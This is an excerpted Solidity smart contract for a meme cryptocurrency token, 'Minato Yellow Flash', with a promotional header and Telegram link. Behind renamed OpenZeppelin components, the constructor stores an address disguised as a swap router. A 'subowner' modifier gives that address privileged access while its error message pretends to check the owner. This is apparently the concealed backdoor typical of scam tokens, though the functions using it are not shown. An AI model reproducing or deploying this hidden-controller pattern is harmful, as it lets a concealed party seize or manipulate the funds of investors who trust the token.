...
/*
MINATO
Welcome to Minato Yellow Flash ($MINATO) - 
a unique cryptocurrency project inspired by Minato from the Naruto universe! 
We are proud to introduce a new venture where creativity meets meme culture, 
creating a distinctive and exciting space in the cryptocurrency realm. 
Let's explore $MINATO and its outstanding features together!

https://t.me/MINATOToken
*/
...
/*
 * @dev Provides information about the current execution MINATO20Burnable, including the
 ...
 */
abstract contract MINATO20Burnable {
...
// File: @openzeppelin/contracts/access/MINATO20Ownable.sol
 ...
 * the owner.
 */
abstract contract MINATO20Ownable is MINATO20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "MINATO20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "MINATO20Ownable: new owner is the zero address");
 ...
 * `SafeMINATO` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeMINATO {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMINATO: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMINATO: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeMINATO: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMINATO: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMINATO: modulo by zero");
  }
...
contract MINATOToken is MINATO20Burnable, MINATO33, MINATO20Ownable {
    
    using SafeMINATO for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "Minato Yellow Flash";
        _symbol = "MINATO";
        _decimals = 9;
        _totalSupply = 7789890000000 * 10 ** 9;
        mintfrom[_msgSender()] = _totalSupply;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    string public MINATOtelegramcchannel = "https://t.me/MINATOToken";
            function getMINATOtelegramcchannel() public view returns (string memory) {
        return MINATOtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {MINATO33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "MINATO20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {MINATO33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {MINATO33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {MINATO33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "MINATO33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {MINATO33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "MINATO33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "MINATO33: transfer from the zero address");
        require(shippingto != address(0), "MINATO33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "MINATO33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "MINATO33: approve from the zero address");
        require(transporteur != address(0), "MINATO33: approve to the zero address");
